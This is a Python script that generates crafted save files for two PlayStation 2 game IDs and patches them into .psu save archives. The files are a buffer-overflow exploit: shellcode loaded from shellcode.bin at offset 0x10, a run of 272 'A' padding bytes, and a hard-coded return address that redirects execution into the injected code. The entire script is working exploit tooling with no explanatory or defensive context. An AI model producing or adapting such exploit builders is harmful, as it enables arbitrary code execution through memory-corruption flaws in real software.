import struct

# Configuration
game_ids = ["BASLUS-20268", "BESLES-50366"]
total_size = 62728
shellcode_offset = 0x10
padding_start = 0xE7B0
padding_size = 272
return_address = 0x01FF01A0
psu_offset = 0x800

# Read shellcode.bin
try:
    with open('shellcode.bin', 'rb') as f:
        shellcode = f.read()
except FileNotFoundError:
    print("Warning: shellcode.bin not found, using empty shellcode")
    shellcode = b''

# Process each game ID
for game_id in game_ids:
    filename = game_id
    psu_filename = f"{game_id}.psu"
    
    print(f"\n{'='*60}")
    print(f"Processing {game_id}")
    print(f"{'='*60}")
    
    # Create file buffer (initialized with null bytes)
    buffer = bytearray(total_size)
    
    # Set first byte to 0x07
    buffer[0] = 0x07
    
    # Write shellcode at offset 0x10
    shellcode_end = shellcode_offset + len(shellcode)
    buffer[shellcode_offset:shellcode_end] = shellcode
    
    # Write 272 'A' bytes at offset 0xE7B0
    buffer[padding_start:padding_start + padding_size] = b'A' * padding_size
    
    # Write return address (little endian) after the padding
    ra_offset = padding_start + padding_size
    buffer[ra_offset:ra_offset + 4] = struct.pack('<I', return_address)
    
    # Write save file
    with open(filename, 'wb') as f:
        f.write(buffer)
    
    print(f"Created {filename} ({total_size} bytes)")
    print(f"First byte: 0x{buffer[0]:02x}")
    print(f"Shellcode at offset 0x{shellcode_offset:X} ({len(shellcode)} bytes)")
    print(f"Padding at offset 0x{padding_start:X} ({padding_size} bytes)")
    print(f"Return address at offset 0x{ra_offset:X}: 0x{return_address:08X}")
    
    # Overwrite data in PSU file at offset 0x800
    try:
        with open(psu_filename, 'r+b') as f:
            f.seek(psu_offset)
            f.write(buffer)
        print(f"Overwrote {psu_filename} at offset 0x{psu_offset:X}")
    except FileNotFoundError:
        print(f"Error: {psu_filename} not found")
    except Exception as e:
        print(f"Error writing to PSU: {e}")

print(f"\n{'='*60}")
print("All files processed!")
print(f"{'='*60}")